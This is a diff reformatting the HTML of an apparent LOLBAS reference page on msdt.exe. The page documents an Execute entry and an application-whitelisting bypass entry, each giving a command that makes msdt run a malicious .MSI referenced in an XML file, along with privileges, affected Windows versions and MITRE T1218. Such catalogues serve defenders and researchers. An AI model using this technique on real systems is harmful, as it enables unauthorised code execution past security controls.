@@ -28,18 +28,22 @@
     </div>
 </h1>
 
-
 <ul class="function-list">
-    
-    
-    <li><a href="/lolbas/Binaries/Msdt/#execute">Execute</a></li>
-    
-    
-    <li><a href="/lolbas/Binaries/Msdt/#awl bypass">AWL bypass</a></li>
-    
+	
+	
+	
+	<li><a href="/lolbas/Binaries/Msdt/#execute">Execute</a></li>
+	
+	
+	<li><a href="/lolbas/Binaries/Msdt/#awl bypass">AWL bypass</a></li>
+	
 </ul>
 
+	
+
 <p>Microsoft diagnostics tool</p>
+
+
 
 <br>
 <p><b>Paths:</b> 
@@ -53,94 +57,75 @@
 </p>
 <br>
 <b>Resources:</b> 	
-	<ul style="list-style-type:none">
+<br>
 	
-	<li><a href="https://web.archive.org/web/20160322142537/https://cybersyndicates.com/2015/10/a-no-bull-guide-to-malicious-windows-trouble-shooting-packs-and-application-whitelist-bypass/">https://web.archive.org/web/20160322142537/https://cybersyndicates.com/2015/10/a-no-bull-guide-to-malicious-windows-trouble-shooting-packs-and-application-whitelist-bypass/</a></li>
+	<a href="https://web.archive.org/web/20160322142537/https://cybersyndicates.com/2015/10/a-no-bull-guide-to-malicious-windows-trouble-shooting-packs-and-application-whitelist-bypass/">https://web.archive.org/web/20160322142537/https://cybersyndicates.com/2015/10/a-no-bull-guide-to-malicious-windows-trouble-shooting-packs-and-application-whitelist-bypass/</a>
+	<br>
 	
-	<li><a href="https://oddvar.moe/2017/12/21/applocker-case-study-how-insecure-is-it-really-part-2/">https://oddvar.moe/2017/12/21/applocker-case-study-how-insecure-is-it-really-part-2/</a></li>
+	<a href="https://oddvar.moe/2017/12/21/applocker-case-study-how-insecure-is-it-really-part-2/">https://oddvar.moe/2017/12/21/applocker-case-study-how-insecure-is-it-really-part-2/</a>
+	<br>
 	
-	<li><a href="https://twitter.com/harr0ey/status/991338229952598016">https://twitter.com/harr0ey/status/991338229952598016</a></li>
+	<a href="https://twitter.com/harr0ey/status/991338229952598016">https://twitter.com/harr0ey/status/991338229952598016</a>
+	<br>
 	 
-	</ul>
 <br>
 <p><b>Acknowledgement:</b> 
-	<ul style="list-style-type:none">
+<br>
 	
-	<li> - <a href="https://twitter.com/"></a </li>
+	 - <a href="https://twitter.com/"></a>
+	<br>
 	 
-	</ul>
 </p>
 <br>
-<p><b>Detection:</b> 
-	<ul style="list-style-type:none">
+<p><b>Detection:</b>
+<br>
 	
-	<li></li>
+	
+	<br>
 	 
-	</ul>
 </p>
 <br>
 <br>
 
 
 
-
-
-
-<h2 id="execute" class="function-name">Execute</h2>
-
-<p>The LOLBAS can achieve abritrary code execution.</p>
-
-
-<ul class="examples">
-
-    
-
-
-
-    <li>
-        <p>Executes the Microsoft Diagnostics Tool and executes the malicious .MSI referenced in the PCW8E57.xml file.</p>
-
+	
+<h2 id="execute" class ="function-name">Execute</h2>
+	
+		Executes the Microsoft Diagnostics Tool and executes the malicious .MSI referenced in the PCW8E57.xml file.
+		<br>
+		<pre><code>msdt.exe -path C:\WINDOWS\diagnostics\index\PCWDiagnostic.xml -af C:\PCW8E57.xml /skip TRUE</code></pre>
 		Usecase:Execute code
-        <pre><code>msdt.exe -path C:\WINDOWS\diagnostics\index\PCWDiagnostic.xml -af C:\PCW8E57.xml /skip TRUE</code></pre>
-    </li>
-	<li>Privileges required:User</li>
-	<li>OS:Windows vista, Windows 7, Windows 8, Windows 8.1, Windows 10</li>
-	<li>Mitre:<a href="https://attack.mitre.org/wiki/Technique/T1218">T1218</a></li>
-	<br><br>	
-    
+		<br>
+		Privileges required:User
+		<br>
+		OS:Windows vista, Windows 7, Windows 8, Windows 8.1, Windows 10
+		<br>
+		Mitre:<a href="https://attack.mitre.org/wiki/Technique/T1218">T1218</a>
+		<br>
+		<br>
+		<br>
+		<br>
+	
 
-</ul>
-<br><br>
-
-
-
-
-
-<h2 id="awl bypass" class="function-name">AWL bypass</h2>
-
-<p>The LOLBAS can bypass application whitelisting solutions.</p>
-
-
-<ul class="examples">
-
-    
-
-
-
-    <li>
-        <p>Executes the Microsoft Diagnostics Tool and executes the malicious .MSI referenced in the PCW8E57.xml file.</p>
-
+	
+<h2 id="awl bypass" class ="function-name">AWL bypass</h2>
+	
+		Executes the Microsoft Diagnostics Tool and executes the malicious .MSI referenced in the PCW8E57.xml file.
+		<br>
+		<pre><code>msdt.exe -path C:\WINDOWS\diagnostics\index\PCWDiagnostic.xml -af C:\PCW8E57.xml /skip TRUE</code></pre>
 		Usecase:Execute code bypass Application whitelisting
-        <pre><code>msdt.exe -path C:\WINDOWS\diagnostics\index\PCWDiagnostic.xml -af C:\PCW8E57.xml /skip TRUE</code></pre>
-    </li>
-	<li>Privileges required:User</li>
-	<li>OS:Windows vista, Windows 7, Windows 8, Windows 8.1, Windows 10</li>
-	<li>Mitre:<a href="https://attack.mitre.org/wiki/Technique/T1218">T1218</a></li>
-	<br><br>	
-    
-
-</ul>
-<br><br>
+		<br>
+		Privileges required:User
+		<br>
+		OS:Windows vista, Windows 7, Windows 8, Windows 8.1, Windows 10
+		<br>
+		Mitre:<a href="https://attack.mitre.org/wiki/Technique/T1218">T1218</a>
+		<br>
+		<br>
+		<br>
+		<br>
+	
 
         <script>
          // add permalink on headings
